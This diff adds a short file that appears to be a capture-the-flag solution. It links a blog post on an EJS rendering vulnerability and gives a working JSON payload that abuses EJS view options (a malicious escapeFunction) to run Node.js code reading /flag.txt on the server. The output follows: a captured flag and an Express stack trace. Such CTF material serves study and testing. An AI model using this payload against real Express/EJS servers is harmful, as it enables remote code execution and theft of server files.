@@ -1,0 +1,17 @@
+https://blog.huli.tw/2023/06/22/en/ejs-render-vulnerability-ctf/
+
+j:{"cache":false,"settings":{"view options":{"client":true,"escapeFunction":"0,(()=>{throw new Error(process.mainModule.require(\"fs\").readFileSync(\"/flag.txt\"))})()"}}}
+
+Error: BITSCTF{Juggling_With_Tokens:_A_Circus_of_RCE!}
+
+
+    at eval ("/server/view/index.ejs":26:38)
+    at index ("/server/view/index.ejs":26:109)
+    at tryHandleCache (/server/node_modules/ejs/lib/ejs.js:272:36)
+    at exports.renderFile [as engine] (/server/node_modules/ejs/lib/ejs.js:489:10)
+    at View.render (/server/node_modules/express/lib/view.js:135:8)
+    at tryRender (/server/node_modules/express/lib/application.js:640:10)
+    at Function.render (/server/node_modules/express/lib/application.js:592:3)
+    at ServerResponse.render (/server/node_modules/express/lib/response.js:1017:7)
+    at /server/app.js:50:9
+    at Layer.handle [as handle_request] (/server/node_modules/express/lib/router/layer.js:95:5)
